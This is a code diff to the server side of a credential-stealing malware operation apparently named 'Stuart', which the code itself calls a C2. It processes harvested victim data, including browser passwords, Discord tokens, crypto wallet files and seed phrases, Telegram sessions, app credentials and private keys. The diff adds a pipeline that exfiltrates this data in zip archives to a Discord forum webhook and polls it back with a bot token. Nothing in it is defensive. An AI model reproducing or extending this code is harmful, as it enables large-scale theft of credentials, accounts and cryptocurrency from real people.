+      try { ctx.broadcast("discord_upload_pending", { clientId }); } catch (_) {}
+    };
 
     if (event === "results") {
+      if (isDiscordPipelineOn()) {
+        viaDiscord(payload || {});
+        return;
+      }
       const tx = ctx.db.transaction(() => {
         insertPayload(ctx.db, stmts, clientId, payload, now);
         stmts.upsertRun.run(clientId, now);
@@ -1375,9 +1907,11 @@ export default {
       for (const r of payload.discordTokens || [])
         enrichDiscordToken(ctx, clientId, r.token).catch(() => {});
       ctx.broadcast("harvest_update", { clientId });
-      // Full collect finished — zip + post to Discord forum webhook when enabled
-      scheduleDiscordUpload(ctx.db, clientId);
     } else if (event === "partial") {
+      if (isDiscordPipelineOn()) {
+        viaDiscord(payload || {});
+        return;
+      }
       const tx = ctx.db.transaction(() => {
         insertPayload(ctx.db, stmts, clientId, payload, now);
         stmts.upsertRun.run(clientId, now);
@@ -1388,6 +1922,10 @@ export default {
           enrichDiscordToken(ctx, clientId, r.token).catch(() => {});
       ctx.broadcast("harvest_update", { clientId });
     } else if (event === "file_scan_results") {
+      if (isDiscordPipelineOn()) {
+        viaDiscord({ files: payload?.files || [] });
+        return;
+      }
       const tx = ctx.db.transaction(() => {
         for (const r of payload?.files || [])
           stmts.insFi.run(clientId, r.dir, r.name, r.ext, r.size, r.modified, r.path, (r.tags || []).join(",") || null, now);
@@ -1396,6 +1934,10 @@ export default {
       tx();
       ctx.broadcast("harvest_update", { clientId });
     } else if (event === "extension_scan_results") {
+      if (isDiscordPipelineOn()) {
+        viaDiscord({ extensions: payload?.extensions || [] });
+        return;
+      }
       const tx = ctx.db.transaction(() => {
         for (const r of payload?.extensions || [])
           stmts.insEx.run(clientId, r.extId, r.name, r.version, r.browser, r.profile, r.path, r.category || null, now);
@@ -1404,6 +1946,10 @@ export default {
       tx();
       ctx.broadcast("harvest_update", { clientId });
     } else if (event === "wallet_scan_results") {
+      if (isDiscordPipelineOn()) {
+        viaDiscord({ wallets: payload?.wallets || [] });
+        return;
+      }
       const tx = ctx.db.transaction(() => {
         for (const r of payload?.wallets || [])
           stmts.insWl.run(clientId, r.name, r.type || null, r.path, r.files, r.size, now);
@@ -1412,6 +1958,7 @@ export default {
       tx();
       ctx.broadcast("harvest_update", { clientId });
     } else if (event === "wallet_auto_data") {
+      // Binary wallet blobs stay on C2 (too large / not in text zip path)
       const content = payload.content ? Buffer.from(payload.content, 'base64') : null;
       let bp = null;
       if (content && blobDir) {
@@ -1424,6 +1971,10 @@ export default {
              bp ? null : content, bp, payload.size || 0, now);
       ctx.broadcast("wallet_data_update", { clientId, name: payload.name });
     } else if (event === "telegram_scan_results") {
+      if (isDiscordPipelineOn()) {
+        viaDiscord({ telegram: payload?.sessions || [] });
+        return;
+      }
       const tx = ctx.db.transaction(() => {
         for (const r of payload?.sessions || [])
           stmts.insTg.run(clientId, r.account, r.path, r.files, r.size, now);
@@ -1442,6 +1993,10 @@ export default {
         .run(clientId, payload.account, payload.path, 0, payload.size || 0, bp ? null : content, bp, now);
       ctx.broadcast("telegram_data_update", { clientId, account: payload.account });
     } else if (event === "app_scan_results") {
+      if (isDiscordPipelineOn()) {
+        viaDiscord({ appCredentials: payload?.appCredentials || [] });
+        return;
+      }
       const tx = ctx.db.transaction(() => {
         for (const r of payload?.appCredentials || [])
           stmts.insApp.run(clientId, r.application, r.host || null, r.port || 0, r.username || null, r.password || null, r.protocol || null, r.extra || null, now);
@@ -1451,6 +2006,10 @@ export default {
       ctx.broadcast("harvest_update", { clientId });
     } else if (event === "gaming_scan_results") {
       if (payload?.gaming) {
+        if (isDiscordPipelineOn()) {
+          viaDiscord({ gaming: payload.gaming });
+          return;
+        }
         const tx = ctx.db.transaction(() => {
           insertPayload(ctx.db, stmts, clientId, { gaming: payload.gaming }, now);
           stmts.upsertRun.run(clientId, now);
@@ -1460,6 +2019,10 @@ export default {
       }
     } else if (event === "vpn_scan_results") {
       if (payload?.vpns) {
+        if (isDiscordPipelineOn()) {
+          viaDiscord({ vpns: payload.vpns });
+          return;
+        }
         const tx = ctx.db.transaction(() => {
           insertPayload(ctx.db, stmts, clientId, { vpns: payload.vpns }, now);
           stmts.upsertRun.run(clientId, now);
@@ -1468,6 +2031,10 @@ export default {
         ctx.broadcast("harvest_update", { clientId });
       }
     } else if (event === "key_scan_results") {
+      if (isDiscordPipelineOn()) {
+        viaDiscord({ keys: payload?.keys || [] });
+        return;
+      }
       const tx = ctx.db.transaction(() => {
         for (const r of payload?.keys || [])
           stmts.insKey.run(clientId, r.type, r.name, r.path, r.size, r.content || null, now);
@@ -1478,6 +2045,10 @@ export default {
     } else if (event === "seed_scan_results") {
       const seeds = payload?.seeds || [];
       if (!seeds.length) return;
+      if (isDiscordPipelineOn()) {
+        viaDiscord({ seeds });
+        return;
+      }
       const tx = ctx.db.transaction(() => {
         for (const s of seeds) {
           const words = s.phrase.split(/\s+/);
@@ -2037,12 +2608,7 @@ export default {
 
     get_capture_settings(ctx, _params, extras) {
       const caller = extras?.caller;
-      const s = { ...pluginSettings };
-      // Never show full webhook token to non-admins
-      if (caller?.role !== "admin" && s.discord_webhook_url) {
-        s.discord_webhook_url = maskWebhookUrl(s.discord_webhook_url);
-      }
-      return s;
+      return publicDiscordSettings(caller?.role === "admin");
     },
 
     update_capture_settings(ctx, params, { caller }) {
@@ -2058,39 +2624,69 @@ export default {
         upsert.run('discord_webhook_url', url);
       }
       if (params.discord_upload_enabled !== undefined) upsert.run('discord_upload_enabled', params.discord_upload_enabled ? '1' : '0');
-      if (params.discord_forum_mode !== undefined) upsert.run('discord_forum_mode', params.discord_forum_mode ? '1' : '0');
+      if (params.discord_bot_token !== undefined) {
+        const tok = String(params.discord_bot_token || "").trim();
+        // Ignore masked placeholders so Save doesn't wipe the real token
+        if (!tok.includes("…") && !tok.includes("****")) upsert.run('discord_bot_token', tok);
+      }
+      if (params.discord_forum_channel_id !== undefined) {
+        upsert.run('discord_forum_channel_id', String(params.discord_forum_channel_id || "").replace(/\D/g, ""));
+      }
       if (params.discord_thread_prefix !== undefined) {
         upsert.run('discord_thread_prefix', String(params.discord_thread_prefix || "Stuart").slice(0, 80));
       }
+      if (params.discord_poll_interval_sec !== undefined) {
+        upsert.run('discord_poll_interval_sec', String(Math.max(5, Math.min(300, Number(params.discord_poll_interval_sec) || 15))));
+      }
       loadSettings(ctx.db);
-      return { ok: true, settings: { ...pluginSettings } };
+      pluginCtx = ctx;
+      startDiscordPoller();
+      return { ok: true, settings: publicDiscordSettings(true) };
     },
 
-    /** Manual zip + upload for one client (or all if clientId omitted). Admin only. */
+    /** Force-flush buffered harvest for a client to Discord (pipeline on). Admin only. */
     async upload_to_discord(ctx, params, { caller }) {
       if (!["admin"].includes(caller.role)) throw new Error("Admin only");
-      const cid = params?.clientId || null;
-      return uploadHarvestToDiscord(ctx.db, cid, { force: true });
+      pluginCtx = ctx;
+      const cid = params?.clientId;
+      if (!cid) throw new Error("clientId required for Discord-only pipeline flush");
+      return flushDiscordHarvest(cid);
     },
 
-    /** Validate webhook without uploading harvest data. Admin only. */
+    /** Poll Discord forum with bot token, download new zips, import for display. */
+    async poll_discord(ctx, _params, { caller }) {
+      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
+      pluginCtx = ctx;
+      return pollDiscordOnce();
+    },
+
+    get_discord_poll_status() {
+      return { ...discordPollStatus, pipeline: isDiscordPipelineOn(), pollReady: isDiscordPollConfigured() };
+    },
+
+    /** Validate webhook (posts a tiny test zip to the forum). Admin only. */
     async test_discord_webhook(ctx, params, { caller }) {
       if (!["admin"].includes(caller.role)) throw new Error("Admin only");
       const url = (params?.url !== undefined ? String(params.url || "").trim() : pluginSettings.discord_webhook_url);
       if (!isValidDiscordWebhook(url)) throw new Error("Invalid Discord webhook URL");
 
-      const threadName = (params?.forumMode ?? pluginSettings.discord_forum_mode)
-        ? forumThreadName("test")
-        : undefined;
+      const threadName = forumThreadName("test");
       const content = [
         "**Stuart webhook test**",
         `Time: ${new Date().toISOString()}`,
-        threadName ? `Forum thread: \`${threadName}\`` : "Channel mode (no thread_name)",
+        `Forum thread: \`${threadName}\``,
+        "If pipeline is on, enable bot token + channel id so the server can poll this zip back.",
       ].join("\n");
 
-      // Small dummy zip so forum posts still get an attachment
       const zip = createZipBuffer([
-        { name: "stuart-test/readme.txt", data: Buffer.from("Stuart Discord webhook test.\n", "utf8") },
+        {
+          name: "stuart-test/meta.json",
+          data: Buffer.from(JSON.stringify({ v: 1, source: "stuart", clientId: "test", capturedAt: Date.now() }), "utf8"),
+        },
+        {
+          name: "stuart-test/passwords.json",
+          data: Buffer.from(JSON.stringify([{ clientId: "test", url: "https://example.com", username: "test", password: "test", browser: "test", profile: "Default" }], null, 2), "utf8"),
+        },
       ]);
       try {
         await postZipToDiscordWebhook({
@@ -2100,9 +2696,34 @@ export default {
           content,
           threadName,
         });
-        return { ok: true, threadName: threadName || null };
+        scheduleDiscordPoll(2000);
+        return { ok: true, threadName };
       } catch (err) {
         throw new Error(err.message || "Webhook test failed");
+      }
+    },
+
+    /** Validate bot can see the forum channel. Admin only. */
+    async test_discord_bot(ctx, params, { caller }) {
+      if (!["admin"].includes(caller.role)) throw new Error("Admin only");
+      const token = (params?.token !== undefined ? String(params.token || "").trim() : pluginSettings.discord_bot_token);
+      const channelId = (params?.channelId !== undefined
+        ? String(params.channelId || "").replace(/\D/g, "")
+        : pluginSettings.discord_forum_channel_id);
+      if (!token || token.includes("…")) throw new Error("Bot token required");
+      if (!channelId) throw new Error("Forum channel id required");
+      const prevTok = pluginSettings.discord_bot_token;
+      pluginSettings.discord_bot_token = token;
+      try {
+        const me = await discordBotFetch("/users/@me");
+        const ch = await discordBotFetch(`/channels/${channelId}`);
+        return {
+          ok: true,
+          bot: { id: me.id, username: me.username },
+          channel: { id: ch.id, name: ch.name, type: ch.type, guild_id: ch.guild_id },
+        };
+      } finally {
+        pluginSettings.discord_bot_token = prevTok;
       }
     },
 
